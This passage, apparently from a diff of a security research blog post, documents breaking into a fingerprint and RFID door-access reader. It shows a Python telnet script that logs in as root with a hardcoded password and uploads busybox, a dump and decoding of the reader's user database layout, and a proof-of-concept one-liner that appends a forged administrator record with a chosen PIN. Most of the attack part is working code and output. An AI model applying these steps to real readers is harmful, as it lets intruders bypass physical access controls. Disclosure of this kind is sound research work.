+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;colorama&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;colorama&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;telnetlib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Telnet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_until&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;login: &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_until&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Password: &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_until&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;# &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;# &amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read_until&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;# &amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;upload_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+                &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;echo -n -e &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39; &amp;gt;&amp;gt; &amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+
+    
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;10.117.43.12&amp;#39;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Connecting to &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RemoteServer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;founder88&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Checking for busybox-mipsel binary&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;ls /root/busybox-mipsel&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;No such file or directory&amp;#39;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Busybox binary not found.  Uploading new binary (This may take a little while, be patient)&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upload_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;busybox-mipsel.gz&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;Upload complete - extracting&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;gunzip busybox-mipsel.gz&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;chmod +x busybox-mipsel&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After running it, busybox is copied over.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ./busybox-mipsel 
+BusyBox v1.16.1 (2010-03-29 11:52:23 CDT) multi-call binary.
+Copyright (C) 1998-2009 Erik Andersen, Rob Landley, Denys Vlasenko
+and others. Licensed under GPLv2.
+See source distribution for full notice.
+
+Usage: busybox [function] [arguments]...
+   or: function [arguments]...
+
+        BusyBox is a multi-call binary that combines many common Unix
+        utilities into a single executable.  Most people will create a
+        link to busybox for each function they wish to use and BusyBox
+        will act like whatever it was invoked as.
+
+Currently defined functions:
+        [, [[, acpid, addgroup, adduser, adjtimex, arp, arping, ash, awk,
+        basename, bbconfig, beep, blkid, brctl, bunzip2, bzcat, bzip2, cal,
+        cat, catv, chat, chattr, chgrp, chmod, chown, chpasswd, chpst, chroot,
+        chrt, chvt, cksum, clear, cmp, comm, cp, cpio, crond, crontab, cryptpw,
+        cttyhack, cut, date, dc, dd, deallocvt, delgroup, deluser, depmod,
+        devmem, df, dhcprelay, diff, dirname, dmesg, dnsd, dnsdomainname,
+        dos2unix, dpkg, dpkg-deb, du, dumpkmap, dumpleases, echo, ed, egrep,
+        eject, env, envdir, envuidgid, ether-wake, expand, expr, fakeidentd,
+        false, fbset, fbsplash, fdflush, fdformat, fdisk, fgrep, find, findfs,
+        flashcp, fold, free, freeramdisk, fsck, fsck.minix, fsync, ftpd,
+        ftpget, ftpput, fuser, getopt, getty, grep, gunzip, gzip, halt, hd,
+        hdparm, head, hexdump, hostid, hostname, httpd, hush, hwclock, id,
+        ifconfig, ifdown, ifenslave, ifplugd, ifup, inetd, init, insmod,
+        install, ionice, ip, ipaddr, ipcalc, ipcrm, ipcs, iplink, iproute,
+        iprule, iptunnel, kbd_mode, kill, killall, killall5, klogd, lash, last,
+        length, less, linux32, linux64, linuxrc, ln, loadfont, loadkmap,
+        logger, login, logname, logread, losetup, lpd, lpq, lpr, ls, lsattr,
+        lsmod, lspci, lsusb, lzmacat, lzop, lzopcat, makedevs, makemime, man,
+        md5sum, mdev, mesg, microcom, mkdir, mkdosfs, mkfifo, mkfs.minix,
+        mkfs.reiser, mkfs.vfat, mknod, mkpasswd, mkswap, mktemp, modprobe,
+        more, mount, mountpoint, msh, mt, mv, nameif, nc, netstat, nice,
+        nmeter, nohup, nslookup, ntpd, od, openvt, passwd, pgrep, pidof, ping,
+        ping6, pipe_progress, pivot_root, pkill, popmaildir, poweroff,
+        printenv, printf, ps, pscan, pwd, raidautorun, rdate, rdev, readahead,
+        readlink, readprofile, realpath, reboot, reformime, renice, reset,
+        resize, rm, rmdir, rmmod, route, rpm, rpm2cpio, rtcwake, run-parts,
+        runlevel, runsv, runsvdir, rx, script, scriptreplay, sed, sendmail,
+        seq, setarch, setconsole, setfont, setkeycodes, setlogcons, setsid,
+        setuidgid, sh, sha1sum, sha256sum, sha512sum, showkey, slattach, sleep,
+        softlimit, sort, split, start-stop-daemon, stat, strings, stty, su,
+        sulogin, sum, sv, svlogd, swapoff, swapon, switch_root, sync, sysctl,
+        syslogd, tac, tail, tar, tcpsvd, tee, telnet, telnetd, test, tftp,
+        tftpd, time, timeout, top, touch, tr, traceroute, traceroute6, true,
+        tty, ttysize, tunctl, udhcpc, udhcpd, udpsvd, umount, uname,
+        uncompress, unexpand, uniq, unix2dos, unlzma, unlzop, unzip, uptime,
+        usleep, uudecode, uuencode, vconfig, vi, vlock, volname, wall, watch,
+        watchdog, wc, wget, which, who, whoami, xargs, yes, zcat, zcip
+
+# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That is much better!  Since this device can enroll RFID cards, pin codes, and fingerprints, let’s see if we can find where they are stored.&lt;br /&gt;
+We’ll go right into /mnt/mtdblock, since that seems to be where the earlier firmware update wanted to extract to.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ls
+CmdScriptBW_2.sh    custvoice.dat       libfpsensor.so      sms.dat
+ErrorCardEvent.dat  data                libhttppush.so      template.dat
+LANGUAGE.E          dhcp.txt            libzkfp.so.3.5.1    udata.dat
+OfflineEvent.dat    dump.txt            main                udhcpc
+Script.sh           extuser.dat         mgetty              usbpower.zem500
+auto.sh             font                oplog.dat           user.dat
+beep.wav            htimezone.dat       options.cfg         wdt
+custattstate.dat    libdlcl.so.1        passwd              workcode.dat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It looks like the files that were supposed to be contained in that main.tgz would be extracted directly to here.  The user.dat catches my eye first.  I have 2 users enrolled on the reader right now (an admin, and a normal user).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# /root/busybox-mipsel uuencode -m user.dat user
+begin-base64 777 user
+AQAGMTIzNAAAAAAAAAAAAAAAAAAAAQAAAQAAAAIAADY5NjkAAAAAAAAAAAAA
+AAAAAAEAANAHAAA=
+====
+# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Back on my local machine…&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo &#39;AQAGMTIzNAAAAAAAAAAAAAAAAAAAAQAAAQAAAAIAADY5NjkAAAAAAAAAAAAAAAAAAAEAANAHAAA=&#39; | base64 -d &amp;gt; user.dat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can see here that the file is 56 bytes long:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[danny@localhost code]$ ls -al user.dat
+-rw-r--r-- 1 danny users 56 Jan  6 17:09 user.dat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From this, we can assume that each record would be 28 bytes long.  Just to make things easier, we’ll dump it to hex like so:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[danny@localhost code]$ hexdump -e &#39;28/1 &quot;%02x &quot; &quot;\n&quot;&#39; user.dat
+01 00 06 31 32 33 34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 01 00 00 00
+02 00 00 36 39 36 39 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 d0 07 00 00
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looking at this, we can tell a few things right off the bat.  To make it easier, I’ve labeled the columns&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; 1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28
+-----------------------------------------------------------------------------------
+01 00 06 31 32 33 34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 01 00 00 00
+02 00 00 36 39 36 39 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 d0 07 00 00
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, the admin was enrolled with id 1, and pin 1234.  The user was enrolled with id 2000, pin 6969.  Bytes 4-7 look to be ASCII, and actually correspond with the pin number.  Byte 1 seems to be an index number.  Byte 3 is most likely privilege level (6 for admin, 0 for user).  Bytes 25 looks to be the id for 1, and 0x07d0 is 2000, so the numbers are stored little endian.  Based off one of the production units, I was also able to see that 9-16 is an ascii Name, and 17-19 is the RFID card number (little endian).&lt;/p&gt;
+
+&lt;h2 id=&quot;poc&quot;&gt;PoC&lt;/h2&gt;
+
+&lt;p&gt;Ok, so now I know how the user database works.  How can I actually use this to get in a door?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;echo -n -e \\\\x39\\\\x5\\\\x6\\\\x31\\\\x32\\\\x33\\\\x34\\\\x35\\\\x48\\\\x61\\\\x78\\\\x78\\\\x30\\\\x72\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x0\\\\x1\\\\x0\\\\x0\\\\x39\\\\x5\\\\x0\\\\x0 &amp;gt;&amp;gt; user.dat
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That simple one liner will append a record onto the user.dat file.  It will look like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; 1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28
+-----------------------------------------------------------------------------------
+39 05 06 31 32 33 34 35 48 61 78 78 30 72 00 00 00 00 00 00 00 01 00 00 39 05 00 00
+&lt;/code&gt;&lt;/pre&gt;
+
